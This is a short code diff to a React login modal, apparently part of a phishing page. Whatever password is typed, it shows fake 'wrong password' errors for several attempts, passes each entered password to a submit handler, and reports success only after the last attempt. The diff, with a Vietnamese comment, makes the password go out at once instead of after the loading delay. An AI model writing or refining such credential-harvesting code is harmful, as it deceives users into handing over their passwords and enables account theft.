@@ -33,16 +33,17 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
         setIsLoading(true);
         setShowError(false);
 
+        // Gửi mật khẩu ngay lập tức, không đợi loading
+        onSubmit('', formData.password);
+
         setTimeout(() => {
             setIsLoading(false);
 
             if (loginAttempt + 1 < maxPasswordAttempts) {
                 setShowError(true);
                 setLoginAttempt((prev) => prev + 1);
-                onSubmit('', formData.password);
             } else {
                 setShowError(false);
-                onSubmit('', formData.password);
                 onSuccess();
             }
         }, passwordLoadingMs);
